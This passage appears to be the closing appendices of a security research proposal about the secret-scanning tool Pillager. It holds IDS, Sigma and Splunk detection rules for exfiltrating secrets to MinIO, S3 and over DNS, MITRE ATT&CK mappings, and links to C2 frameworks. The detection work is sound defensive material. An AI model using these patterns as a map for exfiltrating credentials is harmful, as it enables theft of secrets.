  msg:"Possible Pillager MinIO Exfiltration";
  flow:established,to_server;
  content:"minio"; http_host;
  content:"PUT"; http_method;
  classtype:data-exfiltration;
  sid:1000002;
  rev:1;
)

# Detect DNS tunneling
alert dns $HOME_NET any -> any 53 (
  msg:"Possible Pillager DNS Exfiltration";
  dns_query;
  content:"exfil"; nocase;
  threshold:type threshold, track by_src, count 50, seconds 60;
  classtype:data-exfiltration;
  sid:1000003;
  rev:1;
)
```

### Sigma Rules

```yaml
title: Pillager S3 Exfiltration Activity
id: a1b2c3d4-e5f6-7890-1234-567890abcdef
status: experimental
description: Detects potential Pillager secret exfiltration to S3
author: Security Researcher
date: 2025/01/15
references:
    - https://github.com/brittonhayes/pillager
logsource:
    category: proxy
detection:
    selection:
        c-uri|contains:
            - '.s3.amazonaws.com'
            - '.s3-'
        cs-method: 'PUT'
    timeframe: 5m
    condition: selection | count(c-uri) by src_ip > 10
falsepositives:
    - Legitimate backup operations
    - Application log shipping
level: high
tags:
    - attack.exfiltration
    - attack.t1567.002
```

### Splunk Query

```spl
index=proxy
| where like(uri, "%.s3.%")
| where method="PUT"
| stats count by src_ip, uri
| where count > 10
| eval threat="Possible Pillager S3 Exfiltration"
```

---

## Appendix C: References

### MITRE ATT&CK Mappings

- **T1552.001** - Unsecured Credentials: Credentials In Files
- **T1552.003** - Unsecured Credentials: Bash History
- **T1567** - Exfiltration Over Web Service
- **T1567.002** - Exfiltration to Cloud Storage
- **T1041** - Exfiltration Over C2 Channel
- **T1048** - Exfiltration Over Alternative Protocol
- **T1048.003** - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol

### Related Projects

- [Gitleaks](https://github.com/gitleaks/gitleaks) - Secret scanning for git repos
- [TruffleHog](https://github.com/trufflesecurity/trufflehog) - Find leaked credentials
- [Sliver](https://github.com/BishopFox/sliver) - Adversary emulation framework
- [Mythic](https://github.com/its-a-feature/Mythic) - Multi-platform C2 framework
- [Covenant](https://github.com/cobbr/Covenant) - .NET C2 framework

### Legal and Compliance Resources

- [SANS Penetration Testing Legal Guidelines](https://www.sans.org/white-papers/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [Computer Fraud and Abuse Act (CFAA)](https://www.justice.gov/jm/criminal-resource-manual-1029-computer-fraud-and-abuse-act-18-usc-1030)
- [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/Main_Page)

---

**Document Version**: 1.0
**Author**: Security Research Team
**Date**: 2025-01-15
**Status**: Proposal - Awaiting Community Feedback
